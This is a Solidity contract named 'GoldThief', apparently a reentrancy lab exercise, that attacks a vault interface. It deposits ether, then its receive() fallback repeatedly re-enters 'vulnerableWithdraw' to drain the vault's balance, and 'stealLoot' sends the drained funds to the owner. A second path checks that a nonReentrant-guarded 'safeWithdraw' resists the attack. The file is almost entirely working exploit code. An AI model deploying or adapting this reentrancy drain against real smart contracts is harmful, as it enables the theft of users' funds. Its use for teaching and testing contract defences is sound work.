// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

//接口设置，只包含函数签名，没有实现细节
interface IVault {
function deposit() external payable; //发送ETH
function vulnerableWithdraw() external; //触发攻击
function safeWithdraw() external; //测试金库是否会阻挡
}

contract GoldThief {
IVault public targetVault;
address public owner;
uint public attackCount;
bool public attackingSafe;

constructor(address _vaultAddress) {
    targetVault = IVault(_vaultAddress);
    owner = msg.sender;
}

function attackVulnerable() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH to attack"); //诱饵

    attackingSafe = false;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.vulnerableWithdraw();
}

function attackSafe() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH");

    attackingSafe = true;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.safeWithdraw();
}

receive() external payable {
    attackCount++;

    if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
        targetVault.vulnerableWithdraw();
    }

    if (attackingSafe) {
        targetVault.safeWithdraw(); // This will fail due to nonReentrant
    }
}

//提现
function stealLoot() external {
    require(msg.sender == owner, "Only owner");
    payable(owner).transfer(address(this).balance);
}

function getBalance() external view returns (uint256) {
    return address(this).balance;
}
}